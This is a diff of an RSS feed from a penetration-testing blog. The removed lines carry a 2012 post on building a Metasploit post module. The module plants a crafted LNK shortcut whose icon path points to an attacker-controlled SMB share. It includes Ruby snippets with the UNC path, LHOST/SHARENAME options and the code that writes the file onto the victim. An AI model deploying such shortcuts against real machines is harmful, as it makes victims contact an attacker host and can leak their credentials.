@@ -1,54 +1,16 @@
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-  <channel>
-    <title>mona on malicious.link</title>
-    <link>https://malicious.link/categories/mona/</link>
-    <description>Recent content in mona on malicious.link</description>
-    <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language>
-    <lastBuildDate>Sun, 19 Feb 2012 05:57:02 +0000</lastBuildDate>
-    
-        <atom:link href="https://malicious.link/categories/mona/index.xml" rel="self" type="application/rss+xml" />
-    
-    
-    <item>
-      <title>Developing the LNK Metasploit post module with Mona</title>
-      <link>https://malicious.link/post/2012/2012-02-19-developing-the-lnk-metasploit-post-module-with-mona/</link>
-      <pubDate>Sun, 19 Feb 2012 05:57:02 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2012/2012-02-19-developing-the-lnk-metasploit-post-module-with-mona/</guid>
-      <description>&lt;p&gt;I have been using the LNK trick I talked about in my &lt;a href=&#34;https://malicious.link/blog/2012/02/11/ms08_068-ms10_046-fun-until-2018&#34;&gt;last post&lt;/a&gt; for a while, but always needing a Windows machine to create the LNK file. When I decided to write a post about it, I wanted to put the stipulation for myself that I would finally develop a way to get it done with out having to lug around a VM or spin one up every time I needed to change it&amp;rsquo;s target.&lt;/p&gt;
-&lt;p&gt;Of course the first place I looked was Meterpreter&amp;rsquo;s Railgun (direct windows API calling within meterpreter). But to do it with Railgun I would have to develop a way to &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/aa969393.aspx&#34;&gt;work with COM objects&lt;/a&gt;. Something that I don’t believe is built into Railgun (yet… /me nudges chao-mu). The second place I looked was to see if I could just build an LNK file from scratch &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/dd871305(PROT.10).aspx&#34;&gt;using the spec&lt;/a&gt;.. ya…. that didn’t go so..*zzzZZZzzzzzzzZzzz&lt;/p&gt;
-&lt;p&gt;Enter &lt;a href=&#34;http://redmine.corelan.be/projects/mona&#34;&gt;mona&lt;/a&gt;, the &lt;a href=&#34;http://www.corelan.be/&#34;&gt;Corelan Team’s&lt;/a&gt; exploit development plugin for &lt;a href=&#34;http://immunityinc.com/products-immdbg.shtml&#34;&gt;Immunity Debugger&lt;/a&gt;. Now, usually it is used exactly as intended, as an exploit development tool, and I guess you could consider my use of it as an extension of that as well. But, anyways, one of Mona’s many and probably one of the least well known functions is ‘header’. What this function does is simply output a ruby version of the file broken into ASCII and binary parts. That’ll make much more sense in a sec, back to the problem. I need to recreate a file in a way I can manipulate it on the fly with enough agility to be useful to others in a post module without using the spec or Railgun to assist.&lt;/p&gt;
-&lt;p&gt;We start off with the maliciously altered LNK file, and an up to date version of Immunity and mona:&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201202_mona_1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;I copied the shortcut file to the C drive so I didn’t have to specify a huge path in the mona command, and issued:&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;“!mona header C:\autoexec.lnk”&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201202_mona_2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;As you can see, mona breaks up the binary into ‘understandable’ portions, so if it sees a string is keeps it together, if it sees unicode, it actually uses the Rex ruby libraries. You can try it yourself and scroll through the results but when I saw:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;header &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Rex&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Text&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;to_unicode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C:\%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;192.168.100.100&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;w00t&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;bogusimage.png`&amp;#34;&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I knew I was golden. Quick note: pay close attention when you edit the output of this command in a text editor, initially I didn’t notice the ‘tick’ ( ` ) at the end of the share string and it cause me a lot of grief.&lt;/p&gt;
-&lt;p&gt;Cool, so I have a bit of ruby that puts the contents of my LNK file into a ruby variable. Now what?&lt;/p&gt;
-&lt;p&gt;Now I have 3 challenges:&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;It needs to have a user defined target IP at the very least and anything else I work into a variable option for the user.&lt;/li&gt;
-&lt;li&gt;It needs to upload the file to the exploited system.&lt;/li&gt;
-&lt;li&gt;It needs to be up to code on the Metasploit coding standards&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;Changing the line I found for the share name into this:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;lnk &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Rex&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Text&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;to_unicode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#{&lt;/span&gt;datastore&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;LHOST&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#{&lt;/span&gt;datastore&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;SHARENAME&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#{&lt;/span&gt;datastore&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ICONFILENAME&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&amp;#34;&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;‘datastore’ is used as the container for variable set by default or by the user using the module. Adding those option for the user is pretty easy. You just add the following to the ‘register_options’ section of your module:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;OptAddressRange&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;LHOST&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Host listening for incoming SMB/WebDAV traffic&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;),
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;OptString&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;SHARENAME&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Share name on LHOST&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;share1&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;),       
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;OptString&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ICONFILENAME&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;File name on LHOST&amp;#39;s share&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;icon.png&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;OptAddressRange is used instead of a string because it has a bit of validation that you are actually using something that either resembles an IP address or a hostname.&lt;/p&gt;
-&lt;p&gt;Problem 1 solved. Problem 2 was just as easy, the following line:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;file = client.fs.file.new(datastore[&amp;#39;LNKFILENAME&amp;#39;], &amp;#39;wb&amp;#39;)
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;creates a new file on the victim, and ‘file.write(lnk)’ writes the binary contents of the ‘lnk’ variable into it.&lt;/p&gt;
-&lt;p&gt;Problem 3 is much more tricky, but here is the path to wisdom:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ruby /metasploit-directory/tools/msftidy.rb /path/to/my/module/evil.rb
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hope this helps spur people into trying their hand at developing some modules of their own.&lt;/p&gt;
-</description>
-    </item>
-    
-  </channel>
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
+    <channel>
+        <title>mona - Category - Malicious Link - Blog by mubix - Rob Fuller</title>
+        <link>https://malicious.link/categories/mona/</link>
+        <description>mona - Category - Malicious Link - Blog by mubix - Rob Fuller</description>
+        <generator>Hugo -- gohugo.io</generator><language>en</language><managingEditor>mubix@hak5.org (Rob Fuller)</managingEditor>
+            <webMaster>mubix@hak5.org (Rob Fuller)</webMaster><lastBuildDate>Sun, 19 Feb 2012 05:57:02 &#43;0000</lastBuildDate><atom:link href="https://malicious.link/categories/mona/" rel="self" type="application/rss+xml" /><item>
+    <title>Developing the LNK Metasploit post module with Mona</title>
+    <link>https://malicious.link/posts/2012/2012-02-19-developing-the-lnk-metasploit-post-module-with-mona/</link>
+    <pubDate>Sun, 19 Feb 2012 05:57:02 &#43;0000</pubDate>
+    <author>mubix</author>
+    <guid>https://malicious.link/posts/2012/2012-02-19-developing-the-lnk-metasploit-post-module-with-mona/</guid>
+    <description><![CDATA[I have been using the LNK trick I talked about in my last post for a while, but always needing a Windows machine to create the LNK file. When I decided to write a post about it, I wanted to put the stipulation for myself that I would finally develop a way to get it done with out having to lug around a VM or spin one up every time I needed to change it&rsquo;s target.]]></description>
+</item>
+</channel>
 </rss>
